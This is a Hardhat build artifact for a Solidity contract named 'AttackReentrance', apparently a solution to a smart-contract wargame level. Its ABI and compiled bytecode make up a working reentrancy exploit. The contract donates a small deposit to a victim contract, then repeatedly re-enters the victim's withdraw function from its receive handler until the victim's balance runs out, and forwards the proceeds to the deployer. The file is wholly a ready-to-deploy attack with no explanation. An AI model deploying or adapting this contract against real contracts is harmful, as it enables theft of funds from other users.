{
  "_format": "hh-sol-artifact-1",
  "contractName": "AttackReentrance",
  "sourceName": "contracts/Reentrance.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        },
        {
          "internalType": "address payable",
          "name": "_victim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "donate",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "maliciousWithdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516109833803806109838339818101604052810190610032919061015b565b8160008190555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061019b565b600080fd5b6000819050919050565b6100da816100c7565b81146100e557600080fd5b50565b6000815190506100f7816100d1565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610128826100fd565b9050919050565b6101388161011d565b811461014357600080fd5b50565b6000815190506101558161012f565b92915050565b60008060408385031215610172576101716100c2565b5b6000610180858286016100e8565b925050602061019185828601610146565b9150509250929050565b6107d9806101aa6000396000f3fe6080604052600436106100385760003560e01c80630e00cf6b146100975780633ccfd60b146100c0578063ed88c68e146100d757610092565b36610092576000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631905060005481106100905761008f6000546100e1565b5b005b600080fd5b3480156100a357600080fd5b506100be60048036038101906100b99190610498565b6100e1565b005b3480156100cc57600080fd5b506100d5610247565b005b6100df6102b2565b005b6000816040516024016100f491906104d4565b6040516020818303038152906040527f2e1a7d4d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505090506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16826040516101bc9190610569565b6000604051808303816000865af19150503d80600081146101f9576040519150601f19603f3d011682016040523d82523d6000602084013e6101fe565b606091505b5050905080610242576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161023990610603565b60405180910390fd5b505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156102af573d6000803e3d6000fd5b50565b60005434146102f6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102ed90610695565b60405180910390fd5b60003060405160240161030991906106f6565b6040516020818303038152906040527e362a95000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505090506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600054836040516103d39190610569565b60006040518083038185875af1925050503d8060008114610410576040519150601f19603f3d011682016040523d82523d6000602084013e610415565b606091505b5050905080610459576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161045090610783565b60405180910390fd5b5050565b600080fd5b6000819050919050565b61047581610462565b811461048057600080fd5b50565b6000813590506104928161046c565b92915050565b6000602082840312156104ae576104ad61045d565b5b60006104bc84828501610483565b91505092915050565b6104ce81610462565b82525050565b60006020820190506104e960008301846104c5565b92915050565b600081519050919050565b600081905092915050565b60005b83811015610523578082015181840152602081019050610508565b83811115610532576000848401525b50505050565b6000610543826104ef565b61054d81856104fa565b935061055d818560208601610505565b80840191505092915050565b60006105758284610538565b915081905092915050565b600082825260208201905092915050565b7f5472616e73616374696f6e2063616c6c207573696e6720656e636f646557697460008201527f685369676e6174757265206973206e6f74207375636365737366756c20323232602082015250565b60006105ed604083610580565b91506105f882610591565b604082019050919050565b6000602082019050818103600083015261061c816105e0565b9050919050565b7f506c656173652063616c6c20646f6e617465207769746820302e30303120455460008201527f482e000000000000000000000000000000000000000000000000000000000000602082015250565b600061067f602283610580565b915061068a82610623565b604082019050919050565b600060208201905081810360008301526106ae81610672565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006106e0826106b5565b9050919050565b6106f0816106d5565b82525050565b600060208201905061070b60008301846106e7565b92915050565b7f5472616e73616374696f6e2063616c6c207573696e6720656e636f646557697460008201527f685369676e6174757265206973206e6f74207375636365737366756c00000000602082015250565b600061076d603c83610580565b915061077882610711565b604082019050919050565b6000602082019050818103600083015261079c81610760565b905091905056fea26469706673582212205c26704f704677ea62ef1ad0e57536e781ec411fa857ebafbcf17d7fa314e1d764736f6c634300080d0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}